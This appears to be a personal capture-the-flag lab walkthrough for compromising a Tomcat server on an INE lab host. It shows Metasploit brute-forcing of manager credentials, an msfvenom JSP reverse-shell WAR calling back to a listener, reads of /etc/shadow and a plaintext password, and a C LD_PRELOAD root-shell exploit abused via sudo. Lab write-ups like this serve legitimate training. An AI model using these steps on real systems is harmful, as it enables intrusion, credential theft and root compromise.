---
title: Part 2
updated: 2022-02-13 12:06:03Z
created: 2022-02-13 09:57:43Z
latitude: 45.12540000
longitude: 25.73340000
altitude: 0.0000
---

 - Visiit http://server3.ine.local:8080 in browser
 ![567171aad99134e7efe16cf8978c8d6c.png](../_resources/567171aad99134e7efe16cf8978c8d6c.png)
 - dirb http://server3.ine.local:8080
 ![3cb3ed8e9937ba775d8f762f96524673.png](../_resources/3cb3ed8e9937ba775d8f762f96524673.png)
 
 Manager? Tomcat Manager
 
 ![704953f5a8c93ea3a1f1ffc1273ebc72.png](../_resources/704953f5a8c93ea3a1f1ffc1273ebc72.png)
 Asks for creds
 
- use auxiliary/scanner/http/tomcat_mgr_login
- show options
- set RHOSTS server3.ine.local
- set VERBOSE false
- exploit

![bc87ce7eb4ef27a52e24e5b4206b42c7.png](../_resources/bc87ce7eb4ef27a52e24e5b4206b42c7.png)

Use the creds in browser:

![5852b288b2e8a6c80f877bf1caef6d7e.png](../_resources/5852b288b2e8a6c80f877bf1caef6d7e.png)

Over the Deploy zone, we can upload a reverse shell that Tomcat can execute

![5ce444626cb78a3307b0c0f347e977fa.png](../_resources/5ce444626cb78a3307b0c0f347e977fa.png)

- msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.254.181.2 LPORT=443 -f war > shell.war

![d56c307d7774fc937aff15a3b4514873.png](../_resources/d56c307d7774fc937aff15a3b4514873.png)

Open listening terminal on 443

then connect to:

http://server3.ine.local:8080/shell/

or just click on **shell** on Deploy

![ca63d4b9796bc4732920f7649e2c1c7d.png](../_resources/ca63d4b9796bc4732920f7649e2c1c7d.png)

- python -c 'import pty;pty.spawn("/bin/bash");'
- cat FLAG1	
- cat /etc/shadow

![b51b06c0532a166c4b09ea20eecfba30.png](../_resources/b51b06c0532a166c4b09ea20eecfba30.png)

*robert is able to escalate root!*

cd conf
tar -xvf conf.tar.gz
![faa8be83520901294bc284df7e0fdfd2.png](../_resources/faa8be83520901294bc284df7e0fdfd2.png)

cat conf/tomcat-users.xml

![444202c55e334102989303ca8c8bcd07.png](../_resources/444202c55e334102989303ca8c8bcd07.png)

Password for robert:

**robert@1234567890!@#**

ssh robert@server3.ine.local

cat FLAG2
![79b84136387d58a16e0e103228a0ef27.png](../_resources/79b84136387d58a16e0e103228a0ef27.png)

sudo -l

Making an exploit for the *ls* command:

**#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}**

Saved it as shell.c

vim shell.c (save with ESC and :w, use ESC with :q to exit)

- gcc -fPIC -shared -o shell.so shell.c -nostartfiles
- sudo LD_PRELOAD=/home/robert/shell.so ls
cat /root/FLAG3
